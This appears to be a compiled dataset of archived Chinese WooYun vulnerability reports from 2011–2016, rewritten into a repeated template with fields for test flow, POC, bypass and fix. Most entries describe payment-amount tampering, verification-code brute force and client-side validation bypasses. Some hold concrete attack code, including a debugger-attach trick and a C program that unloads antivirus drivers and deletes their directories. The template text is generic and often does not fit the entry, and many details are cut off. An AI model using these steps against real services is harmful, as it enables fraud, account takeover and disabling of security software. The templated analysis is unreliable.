**修复**: 不要直接post金额啦，后台进行2次价格校验。求20rank，求礼物！
---

---
### [wooyun-2015-0101386] 江西省税务局纳税客户端设计逻辑缺陷可被下载配置（或可影响全国所有纳税组织）
**厂商**: 国家互联网安全中心 | **年份**: 2015 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 功能测试

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 在这里下载https://example.com/[已脱敏]][categoryId=3999][siteName=jx][categoryCode=001027001006002]下载安装完账号admin 密码123456可以选择所有的纳税人也就是说我们只要得到识别号+名称就可以设置通行密码只要打入纳税人识别号+单位名称就可以验证了然后去补下脑https://example.com/[已脱敏] 第1-6为数字为河南省南阳市的税务代码7-15位数字为组织机构代码 这是重点输入这个果然。现在我们还缺单位名称我要弱弱地说 组织机构代码是可以查询的查询URL：https://example.com/[已脱敏]

**POC**: 这个软件虽然是公开下载但是你用默认密码就不好了还让大众都知道你应该效仿中移动的缴费客户端，虽然提供下载，不过如果想以这个机构连接系统，是需要短信或密保验证的而这个税务客户端验证方式只有公开了的组织代码还有软件打开密码 别弄的谁都知道好伐，要低调的告诉缴纳人就好，应该是一个ip一个密码的~还是限制不严

**绕过**: 直接利用

**修复**: #严格限制
---

---
### [wooyun-2015-0103493] 我查查Android客户端二维码扫描可执行恶意代码
**厂商**: wochacha.com | **年份**: 2015 | **类型**: 设计错误/逻辑缺陷

**元思考**: 触发信号: 功能测试

**洞察**: 设计错误/逻辑缺陷防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计错误/逻辑缺陷相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 扫描此二维码点击下结果

**POC**: 扫描此二维码点击下结果

**绕过**: 直接利用

**修复**: 以纯文本显示 11
---

---
### [wooyun-2014-068226] 模拟调试器结束金山毒霸进程
**厂商**: 金山毒霸 | **年份**: 2014 | **类型**: 设计错误/逻辑缺陷

**元思考**: 触发信号: 参数注入

**洞察**: 设计错误/逻辑缺陷防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计错误/逻辑缺陷相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 简单来说代码只有两行：GetProcessIdByName(L"kxetray.exe", &dwPID);DebugActiveProcess(dwPID);其中GetProcessIdByName只需用CreateToolhelp32Snapshot创建进程快照，并用Process32First和Process32Next遍历即可。DebugActiveProcess是API函数，其唯一参数是被调试进程的PID。我们只要不在退出前分离毒霸进程（被调试进程）就可以导致其退出。当然为了在其退出后继续运行，示例中采用了再运行一次自身的办法。源码、程序请见https://example.com/[已脱敏]

**POC**: 运行程序前：运行后：可以看到毒霸已经默默的退出了，但我们的程序（其实是被自身第二次运行的）正在运行。

**绕过**: 直接利用

**修复**: 防止被调试器附件的方法有很多，当然要和毒霸现有的防护方法融合。相信金山的大神可以解决，我就不班门弄斧了。
---

---
### [wooyun-2014-074661] 陌陌科技一处验证码绕过
**厂商**: 某社交科技公司 | **年份**: 2014 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 参数注入, 认证接口

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 从https://example.com/[已脱敏] 下载陌陌争霸游戏的Android版，反编译之后在MDKWebLoginActivity.java中找到两个URL:https://example.com/[已脱敏] https://example.com/[已脱敏] HTTP/1.1username={

**POC**: 直接在那网页上多点击几下就可以看到了。

**绕过**: 过滤绕过

**修复**: 1. 解决验证码不过期，绕过问题2. APP的登陆最好是加上sign签名验证，常见HMAC_SHA1，预防攻击者轻易地非法篡改请求
---

---
### [wooyun-2013-020157] 相宜本草支付漏洞,看我如何花一样钱买5样
**厂商**: 相宜本草 | **年份**: 2013 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 功能测试

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 在订单的时候没有完全判断对方所输入的数字

**POC**: https://example.com/[已脱敏] type="text" name="buycount_289" id="buycount_289" value="-3" class="amipt" readonly="readonly"> 修改这个数字买了这么多 才24元 真便宜呀真便宜就到这里吧我就不提交了嘿嘿

**绕过**: 直接利用

**修复**: 程序员懂得
---

---
### [wooyun-2014-053293] C32ASM缓冲区溢出漏洞
**厂商**: C32ASM | **年份**: 2014 | **类型**: 设计错误/逻辑缺陷

**元思考**: 触发信号: 功能测试

**洞察**: 设计错误/逻辑缺陷防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计错误/逻辑缺陷相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 漏洞触发：在ini文件中找到  “[HEXEDITRECENTFILES]”在下面添加如下内容FILE0=C:\Documents and Settings\windows\桌面\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\.AAAAAAAA然后运行程序-选择文件-打开最近的十六进制文件-选择我们上述定义的文件这时候出现This File is Empty，Are you want o

**POC**: 崩溃图崩溃原理

**绕过**: 直接利用

**修复**: 检测大小
---

---
### [wooyun-2012-07574] 多玩YY特殊字符可存利用场景
**厂商**: 广州多玩 | **年份**: 2012 | **类型**: 设计错误/逻辑缺陷

**元思考**: 触发信号: 功能测试

**洞察**: 设计错误/逻辑缺陷防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计错误/逻辑缺陷相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 公屏右键不能Unicode，新建文本，老样子，右键I-V，复制到输入框，假如我的IP是http://[IP已脱敏]（域名更好），然后在我的空间新建一个名字为moc.udiab.www的文件夹，该文件夹下可以是钓鱼，或者挂马页面，那么实际地址为：http://[IP已脱敏]  经过Unicode编码，显示则为www.baidu.com/[IP已脱敏]

**POC**: (见原文)

**绕过**: 编码绕过

**修复**: 您更专业
---

---
### [wooyun-2015-0114491] 某证券软件iPhone APP增值业务订购存在支付漏洞
**厂商**: 某证券软件 | **年份**: 2015 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 功能测试

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 手机APP端在订购业务时，用Burp拦截POST的数据，修改金额，然后就。。。订购成功了，晕。。。原价518元/季，现价0.01元/季，某证券软件的大大们不要查我水表哈，帮忙取消这个业务就好，如果愿意赠送个一年半载就更好了，哈哈。。。O(∩_∩)O

**POC**: 修改前：修改后：付款图：订购成功图：

**绕过**: 直接利用

**修复**: 你们比我更专业！O(∩_∩)O表查水表，表查水表，表查水表，表查水表，表查水表，表查水表 O(∩_∩)O
---

---
### [wooyun-2015-0120863] 橡果国际一分钱购买任意商品(支付逻辑漏洞)
**厂商**: xiangguo.com | **年份**: 2015 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 功能测试

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: https://example.com/[已脱敏]   随便买一个东西  burp截断改金额。。

**POC**: 随便选择一个物品 在支付处截断    原价2198元选择某电商平台支付  截断修改金额  为0.01元某电商平台扫码支付支付成功坐等发货。。

**绕过**: 截断攻击

**修复**: 你们懂得。。话说什么时候退还我那一分钱的巨额资金。。这可不是一笔小数字。
---

---
### [wooyun-2012-011861] 各大银行ios手机银行客户端不能防护键盘记录
**厂商**: 各大银行 | **年份**: 2012 | **类型**: 设计错误/逻辑缺陷

**元思考**: 触发信号: 认证接口

**洞察**: 设计错误/逻辑缺陷防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计错误/逻辑缺陷相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 在自己的iphone上预装了键盘记录软件。登陆各个银行的客户端软件，发现几乎所有银行的ios客户端都可以被键盘记录下登陆的账号和密码。甚至包括App Store也没有相关防护机制。

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 请咨询高级安全厂商或iphone应用开发厂商
---

---
### [wooyun-2013-033937] 肯德基网上订餐半价商品支付漏洞(绕过一个半价的限制)
**厂商**: 肯德基 | **年份**: 2013 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 功能测试

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 肯德基用脚本判断半价商品是否已经订购,这样我们打开两个网页就可以添加2件半价商品 绕过判断送到了..

**POC**: (见原文)

**绕过**: 过滤绕过

**修复**: 加入服务器判断
---

---
### [wooyun-2015-0149816] 中国保信邮箱系统逻辑缺陷已获取员工及敏感信息
**厂商**: 国家自然基金委员会 | **年份**: 2015 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 认证接口

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: http://**.**.**.**/coremail/index.jsp邮箱系统可爆破，获取员工邮件等敏感信息抓取post信息使用常见人名，只使用了密码123456尝试密码爆破，返回302为成功破解成功登录，可获取通讯录、邮件敏感信息

**POC**: 抓取post信息使用常见人名，只使用了密码123456尝试密码爆破，返回302为成功破解成功登录，可获取通讯录、邮件敏感信息

**绕过**: 直接利用

**修复**: 验证、次数限制
---

---
### [wooyun-2014-073276] 某省会住房公积金系统12329热线逻辑漏洞，可泄漏个人帐号及部分用户密码
**厂商**: cncert国家互联网应急中心 | **年份**: 2014 | **类型**: 账户体系控制不严

**元思考**: 触发信号: 功能测试

**洞察**: 账户体系控制不严防护不足，开发者信任前端输入

**测试流程**:
1. 识别账户体系控制不严相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 之前提交的被指出信息量不够，这次详细点，不是为了rank，而是感觉这个缺陷很严重！12329热线地区：南京地区（其他地区条件有限未做测试，可能江苏甚至更多地区也有问题）操作：在南京地区拨打12329公积金热线提示音：你好，欢迎拨打南京住房XXXXX，个人账户查询请按1，单位请按2 ...XXX..我们按1又有提示音：个人公积金查询请按1，个人补贴请按2 .....XXX...我们再按1又有提示音：个人查询基本信息请按1，个人明细请按2 .....XXX...我们接着按1提示音：请输入个人帐号，卡号或者身份证号，#号结束我们输入身份证号（南京身份证网上不难搜索到）提示音：请输入个人六位公积金帐号密码重点来了！这时候随便输入个6位数字即可这时候虽然密码错误，但是提示音会播报“此账户XXXXXXXXXX”密码错误，这个XXXXX就是对应的公积金账号，虽然我们输入的是身份证，但是他却把公积金帐号被

**POC**: 身份证某搜索引擎即可，不贴图了，下面贴个用这个方法成功登录的图

**绕过**: 直接利用

**修复**: 修改语音提示逻辑
---

---
### [wooyun-2015-0112478] 指尖外勤某数字城市综合管理存在逻辑缺陷
**厂商**: 指尖外勤 | **年份**: 2015 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 认证接口

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: targert_url=https://example.com/[已脱敏]

**POC**: 已经证明，不过暂时不知道是否存在通用型，就只能搜到这个例子。

**绕过**: 直接利用

**修复**: 提示信息改成(账号或密码错误)，不过这样会拉低用户体验。验证码及时更新，验证码验证完成之后强制刷新。
---

---
### [wooyun-2013-043705] 记事狗GBK版本任意文件删除漏洞
**厂商**: 杭州神话 | **年份**: 2013 | **类型**: 设计错误/逻辑缺陷

**元思考**: 触发信号: 参数注入

**洞察**: 设计错误/逻辑缺陷防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计错误/逻辑缺陷相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 问题出在一个自定义函数上，官方好像出了4.5版本没去看是否也是用的这个函数，4.0大概找了下没找到可用包含的，要是4.5也有这个函数，新版本应该有包含漏洞，我就不去深究了，主要是指出问题，修正。include/function/global.func.phpif(!function_exists('jaddslashes')) {function jaddslashes($string) {if(is_array($string)) {$keys = array_keys($string);foreach($keys as $key) {$val = $string[$key];unset($string[$key]);$string[jjaddslashes($key)] = jaddslashes($val);}} else {$string = jjaddslashes($strin

**POC**: (见原文)

**绕过**: 编码绕过, 截断攻击

**修复**: 不包养了。
---

---
### [wooyun-2011-03234] 迅雷协议设计缺陷导致大规模DDOS攻击
**厂商**: 迅雷 | **年份**: 2011 | **类型**: 设计错误/逻辑缺陷

**元思考**: 触发信号: 功能测试

**洞察**: 设计错误/逻辑缺陷防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计错误/逻辑缺陷相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: https://example.com/[已脱敏]

**POC**: https://example.com/[已脱敏]

**绕过**: 直接利用

**修复**: 建议更新客户端和服务端，对用户提交的信息进行真实性检测。
---

---
### [wooyun-2013-037374] 某电商平台手机端手势解锁密码存储分析2
**厂商**: 某电商平台 | **年份**: 2013 | **类型**: 设计错误/逻辑缺陷

**元思考**: 触发信号: 功能测试

**洞察**: 设计错误/逻辑缺陷防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计错误/逻辑缺陷相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: https://example.com/[已脱敏] 各种安全 然后就想试试https://example.com/[已脱敏] 上次修复了 这次是处新的android中data/data/com.eg.android.AlipayGphone/databases/下alipayclient.db里userinfo表中一项 ‘gesturepwd’ cmd5简单加密手势解锁密码

**POC**: alipayclient.db里userinfo表中一项 ‘gesturepwd’ cmd5简单加密手势解锁密码db数据其中的userinfo解密之然后手机画了个图 猜一下 手势解锁的排列方式。。。。为了确定这个地方确实是手势解锁密码 而不是偶然 就又改了一个密码然后又来看看果然变了 解密之额。。和之前的设想对不上了！！！不对，这其中一定有问题 拿出纸笔 画了一个图然后排列方式就跃然纸上了~~~就是这样~

**绕过**: 直接利用

**修复**: https://example.com/[已脱敏] 14:10厂商回复：非常感谢您对我们的支持和关注，该问题已确认，将于新版客户端中修复。不知道你们怎么修复的 外加你们某社交平台说：“假设这个家伙的
---

---
### [wooyun-2016-0167846] 易题库某处设计逻辑缺陷漏洞一枚
**厂商**: 易题库 | **年份**: 2016 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 功能测试

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: rt，vip、试题、学习卡好廉价，还有老师的题库....1）易题库域名：http://**.**.**.**/2）易题库简介：易题库是由北京易思宜学教育科技有限公司自主研发，并独创TAR在线教辅法，专注于提高教学效率、教学成果和提升学生成绩的一款革命性的智能题库产品。话说"国家资源公共教育平台"还隆重推荐呢，3）漏洞验证购买前，还不是vip，在产品里购买个vip试试，点击上图中的“开通VIP钻石版”，一直到支付页面，选择银行卡支付后再选择某银行，这时抓到个包，修改下金额为0.01，成功跳入某银行支付页面，后面就成功支付、买到vip了，

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 你懂得
---

---
### [wooyun-2015-095886] 某电商平台某站充值逻辑漏洞
**厂商**: 某电商平台商城 | **年份**: 2015 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 认证接口

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: https://example.com/[已脱敏]

**POC**: 好害怕，赶紧来提交

**绕过**: 直接利用

**修复**: 开发懂的
---

---
### [wooyun-2014-088194] 对阳光雨露的一次小规模测试
**厂商**: 阳光雨露信息技术服务有限公司 | **年份**: 2014 | **类型**: 内部绝密信息泄漏

**元思考**: 触发信号: 参数注入, 认证接口

**洞察**: 内部绝密信息泄漏防护不足，开发者信任前端输入

**测试流程**:
1. 识别内部绝密信息泄漏相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 故事开始，工欲善其事，必先利其用户名。首先在uc.sunits.com等收集了部分用户名。ucsupportitservicewangxinwuyfhouyjhaoxxmapingchenlinlinmengalinmenglixiajiaoxbwubincwubinzhangkunfuqiongshijfbaiyubbuffcaofzcaoshcengbychengzchenjjechenzpchumydingshuoduhangduxjgaojygaomlgaopengcgaoweibguanlrguokmhejlaheyaohoudbahuangjiebhuangsjhucyhucyahucybhuohyjiaxwjulskangcqkongmzaliangkaiclifyalinbxliucongliujjfliuqicliuxjcliuxyhliuyfgliuysdliuzhen

**POC**: https://example.com/[已脱敏] 就能得到别人的详细信息，包括身份证号码等等。（HRM是你们比较重要的系统了）比如获取wufy并且考勤管理查询存在SQL注入http://[IP已脱敏] /SDMS/incident!findIncidentByProperty.do?inicdentStatu

**绕过**: 直接利用

**修复**: job.wooyun.org找高手！
---

---
### [wooyun-2014-064631] 福昕阅读器读某些pdf时崩溃
**厂商**: 福昕软件 | **年份**: 2014 | **类型**: 设计错误/逻辑缺陷

**元思考**: 触发信号: 功能测试

**洞察**: 设计错误/逻辑缺陷防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计错误/逻辑缺陷相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 今天下载了几个pdf,用福昕pdf阅读器打开就崩溃了。查看pdf属性发现pdf的修改时间为 3219‎年‎1‎月‎6‎日 ‎星期日，‏‎1:57:00这样，福昕阅读器就崩溃了.提供两个pdf:https://example.com/[已脱敏]

**POC**: pdf属性修改时间超过window的时间设置范围打开crash了

**绕过**: 直接利用

**修复**: 他们懂
---

---
### [wooyun-2014-048778] 人人客户端google play版  权限问题可导致隐私泄露
**厂商**: 人人网 | **年份**: 2014 | **类型**: 设计错误/逻辑缺陷

**元思考**: 触发信号: 功能测试

**洞察**: 设计错误/逻辑缺陷防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计错误/逻辑缺陷相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: android客户端 google play 最新版<provider android:name=".contentprovider.AccountProvider" android:permission="com.renren.xiaonei.android.permission.PERMISSION_ADD_ACCOUNT" android:authorities="com.renren.xiaonei.account" /><provider android:name=".contentprovider.BaseProvider" android:permission="com.renren.xiaonei.android.permission.PERMISSION_ADD_ACCOUNT" android:authorities="com.renren.xiaonei.base" 

**POC**: (见原文)

**绕过**: 直接利用

**修复**: android:protectionLevel="dangerous"还是不够，再高点即可
---

---
### [wooyun-2014-051363] 编写ring3程序攻破金山毒霸硬盘保护
**厂商**: 金山毒霸 | **年份**: 2014 | **类型**: 设计错误/逻辑缺陷

**元思考**: 触发信号: 功能测试

**洞察**: 设计错误/逻辑缺陷防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计错误/逻辑缺陷相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 您对您的filter驱动（KNBDrv，kisknl）根本没有保护……该代码跑一边肯定废掉KNBDrv，kisknl，有时要跑两边才能废掉kingsoft antivirus目录下的文件，达到毒霸不能重启的效果记得用管理员权限跑哦#include "stdafx.h"#include <windows.h>#define CMD_PREFIX _T("rd /s /q ")#define CMD_PREFIX_SIZE sizeof(CMD_PREFIX)//雕虫小技，诸君见笑了int _tmain(int argc, _TCHAR* argv[]){_tsystem(_T("fltmc unload KNBDrv"));_tsystem(_T("fltmc unload kisknl"));HKEY hKey;char szValue[MAX_PATH];DWORD dwType;DWO

**POC**: 如需进一步信息，包括并不限于整个工程文件、更具体的系统环境、请我吃饭、讨论明清史等等，邮件发至littlebluepuppy@某邮箱.com

**绕过**: 直接利用

**修复**: 对您的驱动给予保护，对漏洞的上报者给予奖励
---

---
### [wooyun-2015-0103886] 某电商平台网某处可绑定任意手机号（业务逻辑设计不当）
**厂商**: 某电商平台网 | **年份**: 2015 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 功能测试

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 问题出现在某电商平台二手https://example.com/[已脱敏]

**POC**: 首先打开bp抓包，其余过程省略。可以看到这个验证码的回复包是true并且成功。绑定成功！

**绕过**: 直接利用

**修复**: 1、设置验证码有效时间2、加长验证码3、求高RANK！！
---

---
### [wooyun-2014-074376] 某互联网公司充值逻辑缺陷可被非法利用提现
**厂商**: 某互联网公司 | **年份**: 2014 | **类型**: 网络设计缺陷/逻辑错误

**元思考**: 触发信号: 功能测试

**洞察**: 网络设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别网络设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 图片直播 进入活动页面 选择充值金额 选择信用卡支付 付款后手机收到信用卡消费信息，但是话费没有充入，而是财付通直接退款，这财付通退款金额就不用多说了吧 可以直接提现。。。这应该就是传说中的信用卡套现吧退款时间大约 1秒 -5分钟左右

**POC**: 利用页面 https://example.com/[已脱敏]

**绕过**: 直接利用

**修复**: 自学成才
---

---
### [wooyun-2015-0158702] 某市网上办事大厅设计逻辑缺陷重置任意前台账户密码
**厂商**: cncert国家互联网应急中心 | **年份**: 2015 | **类型**: 网络设计缺陷/逻辑错误

**元思考**: 触发信号: 功能测试

**洞察**: 网络设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别网络设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: js验证，打开f12，剩下的就没悬念了...贴图证明

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 这么重要的功能至少不要把验证放在客户端嘛...
---

---
### [wooyun-2015-093133] 中国手游逻辑漏洞导致用户密码随意找回
**厂商**: cmge.com | **年份**: 2015 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 功能测试

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 在中国手游论坛，随便找一个用户，然后点击忘记密码，进行密码找回，然后选择邮箱或者手机进行获取验证码。。然后使用bp进行0000-9999的爆破可以直接获取此验证码，此处为6208输入此验证码，可以直接进行密码修改然后可以成功修改密码。使用此验证码可以多次修改密码。

**POC**: 登录成功。另外，手机注册也存在问题，可以抢注别人手机号码。另外还有个人信息修改存在csrf漏洞，

**绕过**: 直接利用

**修复**: 1.验证码要加长一点，加上验证码次数限制，超过次数自动失效；2.验证码使用过后必须失效；3.csrf加上一个提交验证值听说游戏公司钱多，是不是考虑给我一个小礼物啊！谢谢，么么么
---

---
### [wooyun-2015-0121670] 苏宁易付宝Android客户端重大逻辑缺陷影响大量用户
**厂商**: 江苏某电商平台电子商务有限公司 | **年份**: 2015 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 功能测试

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 1、测试对象：苏宁易付宝Android客户端（主要的问题有两个：1、Android可信任第三方证书；2、验证码最终未发到服务端验证）2、重置密码，随意输入一个验证码，然后拦截返回的数据包3、修改返回包，绕过手机验证码4、如果手机绑定了身份证，则跳转到身份证验证页面，这个没法绕过，因为最后这个是要提交到服务器端的，只能社工了，估计现在社工库这么强大通过手机号得到身份证号不是很难；没有绑定身份证的将直接跳转到重置密码页面

**POC**: 重置密码成功

**绕过**: 过滤绕过

**修复**: 强制认证证书的合法性、验证码服务端校验
---

---
### [wooyun-2015-0125423] 某企业邮支付逻辑漏洞导致15元购买永久邮箱
**厂商**: cncert国家互联网应急中心 | **年份**: 2015 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 功能测试

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 先来注册邮箱页面然后这里抓包改月数都是15一个月哦，我来改5个月看看哈哈总价是不是不变再来试试负值，负值月数应该是永久了吧哈哈ps:最后我没支付 要某电商平台支付  好贵 15块呢ps:因为测试 每个邮箱只能提交一次 ，订单一次，所以abc999_xx  cc bb之类的换动了 不过不影响效果

**POC**: 哈哈

**绕过**: 直接利用

**修复**: 对输入进行后台验证，不予许负值
---

---
### [wooyun-2015-0104421] 麦乐购逻辑缺陷可批量覆盖所有人的信息（涉及30W）
**厂商**: 麦乐购 | **年份**: 2015 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 认证接口

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 首先我们登陆xiaoliu2的号，增加一个收货人的地址：可以看到，这是小李。我们点击编辑，可以看到id号，记住此ID号，等下要用到：https://example.com/[已脱敏] 说明已经把xiaoliu2的id占用过来自己用了，所以xiaoliu2的收货地址就不存在了。这样就可以达到批量覆盖所有人的收货地址。。。也是是批量删除所有人的收货地址。。。利遍就行了，直接拿bur

**POC**: 如上

**绕过**: 直接利用

**修复**: 越权查看他人收货信息做好了，但是越权修改未做好。
---

---
### [wooyun-2013-019044] 优贝网刷钱支付漏洞
**厂商**: 优贝 | **年份**: 2013 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 功能测试

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 挑选商品 加入购物车 改包金额为负因为还有邮费，所以我们多购买几件，加上邮费成为一个负值支付，然后我们发现我们的余额增加了仅仅只为测试，所以我最后取消订单了

**POC**: 上面很详细

**绕过**: 直接利用

**修复**: 你们很专业
---

---
### [wooyun-2015-0163100] missfresh.cn电商平台某处设计逻辑缺陷漏洞一枚
**厂商**: 每日优鲜 | **年份**: 2015 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 参数注入

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 我花了9毛9，冲了200多块钱。正在想是不是要买点水果压压惊直接改封包里的价格参数即可

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 加入验证流程。
---

---
### [wooyun-2015-0143025] 某通信厂商企业演练系统某功能存在逻辑缺陷可撞库爆破
**厂商**: 某通信设备厂商 | **年份**: 2015 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 认证接口

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: http://[IP已脱敏] zxcvbn 可登录系统

**POC**: http://[IP已脱敏] zxcvbn 可登录系统

**绕过**: 直接利用

**修复**: 233
---

---
### [wooyun-2015-0145187] 南方基金Android客户端本地明文存储用户信息、账户资金等信息
**厂商**: 南方基金管理有限公司 | **年份**: 2015 | **类型**: 设计错误/逻辑缺陷

**元思考**: 触发信号: 功能测试

**洞察**: 设计错误/逻辑缺陷防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计错误/逻辑缺陷相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 用户信息、账户资金等信息明文存储在本地数据库中，恶意程序可通过系统漏洞提升权限，窃取应用本地文件数据，造成用户信息泄露。

**POC**: 用户敏感数据明文存储在本地数据库文件中，路径在：/data/data/com.nanfangjijin.app/app_database/localstorage/content_com.nanfangjijin.app.sp_0.localstorage存储用户详细信息，包括手机号、姓名、身份证号、会话session等：存储账户资金信息：

**绕过**: 直接利用

**修复**: 用户敏感数据加密存储。客户端本地尽量少存储用户重要信息。
---

---
### [wooyun-2015-0108090] 某运营商某IDC机房信息安全管理系统设计缺陷致使系统沦陷
**厂商**: 某运营商 | **年份**: 2015 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 后台管理

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: http://[IP已脱敏] 可以直接重置密码step改为4可直接绕过密保问题修改密码后台功能太强大了

**POC**: 后台功能太强大了

**绕过**: 过滤绕过

**修复**: 设计缺陷啊
---

---
### [wooyun-2012-014652] 利用客户端应用程序错误设置拿下网吧服务器
**厂商**: 万象网吧管理系统 | **年份**: 2012 | **类型**: 设计错误/逻辑缺陷

**元思考**: 触发信号: 功能测试

**洞察**: 设计错误/逻辑缺陷防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计错误/逻辑缺陷相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 这个能看懂吧？
---

---
### [wooyun-2015-0161610] Cling翰临科技在线商店逻辑缺陷可导致低价购买手表手环～
**厂商**: 海翰临科技 | **年份**: 2015 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 功能测试

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
